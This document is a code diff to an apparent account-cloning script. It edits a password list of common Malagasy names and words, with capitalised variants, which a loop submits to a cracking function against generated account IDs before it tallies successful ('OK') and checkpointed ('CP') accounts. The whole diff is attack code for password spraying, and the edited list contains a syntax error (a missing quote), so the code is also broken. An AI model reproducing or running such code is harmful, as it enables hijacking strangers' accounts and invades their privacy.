@@ -116,9 +116,9 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nomena','malala','mahefa','mahery','nantenaina','valisoa','amboara','safidy','felana','finoana','papako','nilaina','fanantenana','fanasina','vadiko','mamako','koloina','harena','faniry','hasina','nirina','nekena','fitiavana','dadako','fifalina','lafatra','anjara','lahatra','miangaly','fahendrena','tolotra','tantely','rakotomalala','randria','malalako','fandresena','malala','finaritra','mandresy','fiderana','mendrika','namako','solofoniaina','andria','rakoto','tahiry','valisoa','seheno','fitiavako','rojotiana','solofo','diamondra','tsilavina','maminirina','fifaliana','fahendrena','fiderana','fandresena','nekena','fanantenana','tolotra','jesosy','faneva','milely','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','lahatra','finoana']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nomena','Nomena','mahefa','Mahefa','mahery','Mahery','Malalako','malalako','nantenaina','valisoa','Amboara','amboara','safidy','felana','papako','nilaina','fanantenana','fanasina','vadiko','mamako','koloina','harena','faniry','hasina','nirina','nekena','fitiavana','dadako','fifalina','lafatra','anjara','lahatra','miangaly','fahendrena','tolotra','tantely','rakotomalala','randria','Fenosoa','fenosoa','Fanomezana','fandresena','malala','finaritra','Finaritra','mandresy','Mandresy','fiderana','mendrika','namako','solofoniaina','Rakoto','rakoto','tahiry','Tahiry','valisoa','seheno','fitiavako','rojotiana','solofo','diamondra','tsilavina','maminirina','Fahendrena','fahendrena','fiderana','fandresena','nekena','fanantenana','tolotra','jesosy','faneva','milely','mamisoa','narindra','sarobidy','sarindra','malagasy','Mamiko','mamiko','mamako','Mamako',lahatra','Finoana','finoana']
             Dipto.submit(method_crack,ids,passlist)
-    linex() 
+    linex()
     print(' LE CLONING EST FINI ')
     print(' TOTAL OK ID '+str(len(oks)))
     print(' TOTAL CP ID '+str(len(cps)))
